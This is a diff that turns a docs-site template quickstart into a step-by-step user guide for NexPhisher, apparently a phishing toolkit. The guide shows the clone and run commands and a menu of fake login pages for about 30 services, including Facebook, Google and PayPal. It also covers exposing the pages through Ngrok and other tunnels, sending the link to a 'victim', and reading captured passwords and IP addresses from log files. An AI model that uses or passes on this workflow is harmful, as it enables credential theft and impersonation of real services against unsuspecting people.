@@ -1,80 +1,206 @@
 ---
 title: "Quickstart"
-description: "Start building awesome documentation in minutes"
+description: "Run NexPhisher, select a phishing template, choose a port-forwarding method, and capture credentials."
 ---
 
-## Get started in three steps
+<Warning>
+  **This project is no longer maintained.** For an actively maintained alternative, use [ZPhisher](https://github.com/htr-tech/zphisher) instead.
+</Warning>
 
-Get your documentation site running locally and make your first customization.
+This guide walks you through a complete session from cloning the repository to viewing captured credentials in the terminal.
 
-### Step 1: Set up your local environment
+## Before you begin
 
-<AccordionGroup>
-  <Accordion icon="copy" title="Clone your docs locally">
-    During the onboarding process, you created a GitHub repository with your docs content if you didn't already have one. You can find a link to this repository in your [dashboard](https://dashboard.mintlify.com).
-    
-    To clone the repository locally so that you can make and preview changes to your docs, follow the [Cloning a repository](https://docs.github.com/en/repositories/creating-and-managing-repositories/cloning-a-repository) guide in the GitHub docs.
-  </Accordion>
-  <Accordion icon="rectangle-terminal" title="Start the preview server">
-    1. Install the Mintlify CLI: `npm i -g mint`
-    2. Navigate to your docs directory and run: `mint dev`
-    3. Open `http://localhost:3000` to see your docs live!
-    
-    <Tip>Your preview updates automatically as you edit files.</Tip>
-  </Accordion>
-</AccordionGroup>
+Make sure you have completed installation. If you haven't set up NexPhisher yet, see the [installation guide](/installation) first.
 
-### Step 2: Deploy your changes
+---
 
-<AccordionGroup>
-  <Accordion icon="github" title="Install our GitHub app">
-    Install the Mintlify GitHub app from your [dashboard](https://dashboard.mintlify.com/settings/organization/github-app).
-    
-    Our GitHub app automatically deploys your changes to your docs site, so you don't need to manage deployments yourself.
-</Accordion>
-<Accordion icon="palette" title="Update your site name and colors">
-    For a first change, let's update the name and colors of your docs site.
+## Running a session
 
-    1. Open `docs.json` in your editor.
-    2. Change the `"name"` field to your project name.
-    3. Update the `"colors"` to match your brand.
-    4. Save and see your changes instantly at `http://localhost:3000`.
+<Steps>
+  <Step title="Clone and set up (if you haven't already)">
+    ```bash
+    git clone git://github.com/htr-tech/nexphisher.git
+    cd nexphisher
+    bash setup
+    ```
 
-    <Tip>Try changing the primary color to see an immediate difference!</Tip>
-  </Accordion>
-</AccordionGroup>
+    See the [installation guide](/installation) for full details on what the setup script does.
+  </Step>
 
-### Step 3: Go live
+  <Step title="Start NexPhisher">
+    From inside the `nexphisher/` directory, run:
 
-<Accordion icon="rocket" title="Publish your docs">
-  1. Commit and push your changes.
-  2. Your docs will update and be live in moments!
-</Accordion>
+    ```bash
+    bash nexphisher
+    ```
+
+    On startup, the tool checks that `php`, `curl`, `ssh`, and `unzip` are available in `PATH`, and that the `.htr/` and `.Modules/` directories exist. If any check fails, it prints an error and exits.
+
+    ```text
+    Packages are not Installed ! type bash setup
+    ```
+
+    If you see this message, re-run `bash setup` and try again.
+
+    Once all checks pass, the main menu is displayed:
+
+    ```text
+    [01] Facebook     [11] Twitch       [21] DeviantArt    [99] About
+    [02] Instagram    [12] Pinterest    [22] Badoo         [00] Exit
+    [03] Google       [13] Snapchat     [23] Origin
+    [04] Microsoft    [14] Linkedin     [24] CryptoCoin
+    [05] Netflix      [15] Ebay         [25] Yahoo
+    [06] Paypal       [16] Dropbox      [26] Wordpress
+    [07] Steam        [17] Protonmail   [27] Yandex
+    [08] Twitter      [18] Spotify      [28] StackoverFlow
+    [09] Playstation  [19] Reddit       [29] Vk
+    [10] Github       [20] Adobe        [30] XBOX
+    ```
+  </Step>
+
+  <Step title="Select a phishing template">
+    Enter the number for the platform you want to target. For example, to use the Facebook template, enter `01`:
+
+    ```text
+    [~] Select an option: 01
+    ```
+
+    Some platforms (Facebook, Instagram, Google, VK) offer multiple page variants. For example, after selecting Facebook you'll see a sub-menu:
+
+    ```text
+    [01] Traditional Login Page
+    [02] Advanced Voting Poll Login Page
+    [03] Fake Security Login Page
+    [04] Facebook Messenger Login Page
+    ```
+
+    Select the variant you want, e.g. `01` for the traditional login page.
+
+    <Note>
+      For platforms without variants (Microsoft, Netflix, Steam, etc.), the tool proceeds directly to the port-forwarding menu after you make your selection.
+    </Note>
+  </Step>
+
+  <Step title="Choose a port-forwarding method">
+    After selecting a template, the port-forwarding menu appears:
+
+    ```text
+    [01] LocalHost
+    [02] Ngrok
+    [03] Serveo  [Currently Down]
+    [04] LocalXpose
+    [05] LocalHostRun
+    ```
+
+    Enter the number for your preferred method. For example, to use Ngrok:
+
+    ```text
+    [~] Select a Port Forwarding option: 02
+    ```
+
+    The default if you press Enter without typing is `02` (Ngrok).
+
+    | Option | Service | Notes |
+    |---|---|---|
+    | `01` | LocalHost | Serves at `http://127.0.0.1:5555` — accessible on the local network only |
+    | `02` | Ngrok | Generates a public `*.ngrok.io` URL |
+    | `03` | Serveo | SSH-based tunnel via `serveo.net` — marked as currently down |
+    | `04` | LocalXpose | Generates a public `*.loclx.io` URL; supports custom subdomains |
+    | `05` | LocalHostRun | SSH-based tunnel via `ssh.localhost.run` |
+
+    <Note>
+      LocalXpose and Serveo prompt you to optionally enter a custom subdomain before starting the tunnel.
+    </Note>
+  </Step>
+
+  <Step title="Get the generated link">
+    Once the tunnel is established, NexPhisher prints the shareable URL:
+
+    ```text
+    [~] Send the link to victim: https://abc123.ngrok.io
+    ```
+
+    The tool then enters a waiting loop, polling for incoming credentials:
+
+    ```text
+    [~] Waiting for Login Info, Ctrl + C to exit.
+    ```
+
+    Share the printed URL. When a target visits the link and submits the login form, the terminal updates in real time.
+  </Step>
+
+  <Step title="View captured credentials in real time">
+    When a target visits the page, NexPhisher first captures their IP address:
+
+    ```text
+    [~] Victim IP Found !
+    [~] Victim IP: 203.0.113.42
+    [~] Saved: ip.txt
+    ```
+
+    When the login form is submitted, the credentials appear immediately:
+
+    ```text
+    [~] Login info Found !!
+    [~] Account:  example@email.com
+    [~] Password: hunter2
+    [~] Saved: logs/facebook.log
+    [~] Waiting for Next Login Info, Ctrl + C to exit.
+    ```
+
+    The session stays active and continues capturing subsequent submissions until you press `Ctrl+C`.
+  </Step>
+
+  <Step title="Find saved logs">
+    Captured data is written to two locations:
+
+    **Credentials log** — appended to `logs/<platform>.log` after each submission:
+
+    ```bash
+    cat logs/facebook.log
+    ```
+
+    ```text
+    Username: example@email.com
+    Pass: hunter2
+    ```
+
+    **IP address data** — appended to `ip.txt` in the project root each time a new visitor loads the page:
+
+    ```bash
+    cat ip.txt
+    ```
+
+    The filename in `logs/` matches the platform name used internally by the script (e.g., `facebook.log`, `instagram.log`, `google.log`).
+
+    <Tip>
+      To watch the log file update in real time while a session is active, open a second terminal and run `tail -f logs/facebook.log`.
+    </Tip>
+  </Step>
+</Steps>
+
+---
+
+## Stopping a session
+
+Press `Ctrl+C` at any time to stop the tool. NexPhisher kills any running `ngrok`, `php`, and `ssh` processes before exiting.
+
+---
 
 ## Next steps
 
-Now that you have your docs running, explore these key features:
-
 <CardGroup cols={2}>
-
-<Card title="Write Content" icon="pen-to-square" href="/essentials/markdown">
-  Learn MDX syntax and start writing your documentation.
-</Card>
-
-<Card title="Customize style" icon="palette" href="/essentials/settings">
-  Make your docs match your brand perfectly.
-</Card>
-
-<Card title="Add code examples" icon="square-code" href="/essentials/code">
-  Include syntax-highlighted code blocks.
-</Card>
-
-<Card title="API documentation" icon="code" href="/api-reference/introduction">
-  Auto-generate API docs from OpenAPI specs.
-</Card>
-
+  <Card title="Phishing templates" icon="list" href="/usage/phishing-templates">
+    See the full list of 30+ supported platforms and page variants.
+  </Card>
+  <Card title="Port forwarding" icon="network-wired" href="/usage/port-forwarding">
+    Detailed configuration for each tunneling option.
+  </Card>
+  <Card title="Logs and output" icon="file-lines" href="/reference/logs-and-output">
+    Understand the log file format and IP data output.
+  </Card>
+  <Card title="Troubleshooting" icon="circle-exclamation" href="/reference/troubleshooting">
+    Fix common setup and runtime errors.
+  </Card>
 </CardGroup>
-
-<Note>
-  **Need help?** See our [full documentation](https://mintlify.com/docs) or join our [community](https://mintlify.com/community).
-</Note>
